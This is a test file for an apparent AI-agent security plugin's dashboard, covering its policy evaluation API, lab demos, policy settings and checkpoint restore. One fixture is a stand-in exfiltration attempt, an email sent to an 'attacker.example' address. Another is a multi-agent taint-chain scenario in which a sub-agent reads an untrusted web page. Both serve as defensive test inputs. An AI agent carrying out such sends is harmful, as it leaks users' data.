import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { PluginConfig } from "../../config.ts";
import { RecordStore } from "../../core/records.ts";
import { RollbackManager } from "../../core/rollback.ts";
import { startDashboard, type DashboardServer } from "../../server/dashboard.ts";

const tempDirs: string[] = [];
const servers: DashboardServer[] = [];

afterEach(async () => {
  for (const server of servers.splice(0)) await server.close();
  for (const dir of tempDirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

describe("dashboard sidecar policy API", () => {
  it("evaluates tool calls through the same policy engine and exposes checkpoint metadata", async () => {
    const stateDir = mkdtempSync(join(tmpdir(), "agentsentry-sidecar-"));
    tempDirs.push(stateDir);
    const config = new PluginConfig();
    config.dashboard.enabled = true;
    config.dashboard.port = 0;
    config.dashboard.authToken = "sidecar-test-token-12345678901234567890";
    config.storage.stateDir = stateDir;
    config.semantic.enabled = false;
    config.provenanceScan.enabled = false;
    const store = new RecordStore(config);
    const rollback = new RollbackManager(config);
    const server = await startDashboard(config, store, { info: () => undefined }, {
      getConfig: () => config,
      setConfig: () => undefined,
      getRollback: () => rollback,
    });
    servers.push(server);

    const response = await fetch(`${server.url}/api/sidecar/evaluate`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${config.dashboard.authToken}`,
      },
      body: JSON.stringify({
        sessionKey: "sidecar-test",
        resetSession: true,
        task: "请查看项目状态，不要执行外部发送。",
        toolName: "send_email",
        params: { to: "attacker.example@test.invalid", body: "status" },
      }),
    });
    expect(response.status).toBe(200);
    const body = await response.json() as Record<string, unknown>;
    expect(body).toMatchObject({
      ok: true,
      sidecar: true,
      normalized_tool: "send_email",
      decision: expect.stringMatching(/ask|deny/),
    });

    const checkpoints = await fetch(`${server.url}/api/checkpoints`, {
      headers: { Authorization: `Bearer ${config.dashboard.authToken}` },
    });
    expect(checkpoints.status).toBe(200);
    await store.close();
  });

  it("can run as an explicit unauthenticated local sidecar endpoint when configured", async () => {
    const stateDir = mkdtempSync(join(tmpdir(), "agentsentry-sidecar-"));
    tempDirs.push(stateDir);
    const config = new PluginConfig();
    config.dashboard.port = 0;
    config.dashboard.authToken = "sidecar-test-token-abcdefghijklmno123456";
    config.storage.stateDir = stateDir;
    config.semantic.enabled = false;
    config.provenanceScan.enabled = false;
    config.externalPolicy.requireAuth = false;
    const store = new RecordStore(config);
    const server = await startDashboard(config, store, { info: () => undefined });
    servers.push(server);

    const response = await fetch(`${server.url}/api/sidecar/evaluate`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        task: "请读取 README.md。",
        toolName: "read_file",
        params: { path: "README.md" },
      }),
    });
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ ok: true, sidecar: true, normalized_tool: "read_file" });
    await store.close();
  });
});

describe("command lab demonstration routes", () => {
  it("runs the cross-agent taint-chain demo with real policy decisions", async () => {
    const stateDir = mkdtempSync(join(tmpdir(), "agentsentry-lab-"));
    tempDirs.push(stateDir);
    const config = new PluginConfig();
    config.dashboard.port = 0;
    config.dashboard.authToken = "lab-test-token-123456789012345678901234";
    config.storage.stateDir = stateDir;
    config.semantic.enabled = false;
    config.provenanceScan.enabled = false;
    const store = new RecordStore(config);
    const server = await startDashboard(config, store, { info: () => undefined });
    servers.push(server);

    const response = await fetch(`${server.url}/api/lab/command`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${config.dashboard.authToken}`,
      },
      body: JSON.stringify({
        scenario: "multi_agent_taint_chain",
        resetSession: true,
        command: "主 Agent 请让研究子 Agent 阅读供应链周报网页，只把业务结论发回；主 Agent 再整理三条安全摘要。",
      }),
    });
    expect(response.status).toBe(200);
    const body = await response.json() as { decisions?: Array<Record<string, unknown>> };
    const decisions = body.decisions || [];
    expect(decisions.map((item) => item.normalized_tool)).toContain("sessions_send");
    expect(decisions.some((item) => item.normalized_tool === "read_file" && item.decision === "deny")).toBe(true);
    expect(store.list(100).some((record) => record.payload?.scenario === "multi_agent_taint_chain")).toBe(true);
    await store.close();
  });

  it("runs the normal operations demo without raising a high-risk block", async () => {
    const stateDir = mkdtempSync(join(tmpdir(), "agentsentry-lab-"));
    tempDirs.push(stateDir);
    const config = new PluginConfig();
    config.dashboard.port = 0;
    config.dashboard.authToken = "lab-normal-token-1234567890123456789012";
    config.storage.stateDir = stateDir;
    config.semantic.enabled = false;
    config.provenanceScan.enabled = false;
    const store = new RecordStore(config);
    const server = await startDashboard(config, store, { info: () => undefined });
    servers.push(server);

    const response = await fetch(`${server.url}/api/lab/command`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${config.dashboard.authToken}`,
      },
      body: JSON.stringify({
        scenario: "normal_ops_flow",
        resetSession: true,
        command: `请调用 ${server.url}/api/health 检查玄鉴插件健康状态，把结果整理成中文巡检摘要，并保存到 notes/demo-health-report.txt。`,
      }),
    });
    expect(response.status).toBe(200);
    const body = await response.json() as { decisions?: Array<Record<string, unknown>> };
    const decisions = body.decisions || [];
    expect(decisions.length).toBeGreaterThan(0);
    expect(decisions.every((item) => item.decision !== "deny")).toBe(true);
    expect(decisions.some((item) => item.normalized_tool === "call_api")).toBe(true);
    expect(decisions.some((item) => item.normalized_tool === "write_file")).toBe(true);
    await store.close();
  });

  it("exposes policy console, bootstrap metrics, and checkpoint restore endpoints", async () => {
    const stateDir = mkdtempSync(join(tmpdir(), "agentsentry-console-"));
    const workspaceDir = mkdtempSync(join(tmpdir(), "agentsentry-workspace-"));
    tempDirs.push(stateDir, workspaceDir);
    const config = new PluginConfig();
    config.dashboard.port = 0;
    config.dashboard.authToken = "lab-console-token-12345678901234567890";
    config.storage.stateDir = stateDir;
    config.semantic.enabled = false;
    config.provenanceScan.enabled = false;
    const store = new RecordStore(config);
    const rollback = new RollbackManager(config);
    const server = await startDashboard(config, store, { info: () => undefined }, {
      getConfig: () => config,
      setConfig: () => undefined,
      getRollback: () => rollback,
    });
    servers.push(server);

    const policy = await fetch(`${server.url}/api/policy/config`, {
      headers: { Authorization: `Bearer ${config.dashboard.authToken}` },
    }).then((res) => res.json()) as Record<string, unknown>;
    expect(policy).toMatchObject({ ok: true });
    expect(JSON.stringify(policy)).toContain("sessions_send");
    expect(JSON.stringify(policy)).toContain("agent:main");

    const saved = await fetch(`${server.url}/api/policy/config`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${config.dashboard.authToken}`,
      },
      body: JSON.stringify({
        toggles: { multiAgentSecurity: false, rollback: true },
        lists: { allowlistedApiHosts: ["api.example.test"] },
      }),
    }).then((res) => res.json()) as Record<string, unknown>;
    expect(saved).toMatchObject({ ok: true });
    expect(config.multiAgentSecurity.enabled).toBe(false);
    expect(config.policy.allowlistedApiHosts).toEqual(["api.example.test"]);

    store.add({
      run_id: "r1",
      session_key: "s1",
      type: "tool_decision",
      layer: "Tool Boundary",
      severity: "success",
      title: "allow",
      summary: "allow",
      payload: { decision: "allow" },
    });
    const metrics = await fetch(`${server.url}/api/metrics/bootstrap`, {
      headers: { Authorization: `Bearer ${config.dashboard.authToken}` },
    }).then((res) => res.json()) as Record<string, unknown>;
    expect(metrics).toMatchObject({ ok: true, decisions: 1 });

    mkdirSync(join(workspaceDir, "notes"), { recursive: true });
    const target = join(workspaceDir, "notes", "restore-demo.txt");
    writeFileSync(target, "before", "utf8");
    rollback.checkpointOperation({
      action: { tool: "write_file", originalTool: "write_file", args: { path: "notes/restore-demo.txt" }, reason: "test" },
      workspaceDir,
      operationKey: "console-restore-test",
    });
    writeFileSync(target, "after", "utf8");
    const restore = await fetch(`${server.url}/api/checkpoints/restore`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${config.dashboard.authToken}`,
      },
      body: JSON.stringify({ operationKey: "console-restore-test" }),
    }).then((res) => res.json()) as Record<string, unknown>;
    expect(restore).toMatchObject({ ok: true });
    expect(readFileSync(target, "utf8")).toBe("before");
    await store.close();
  });
});
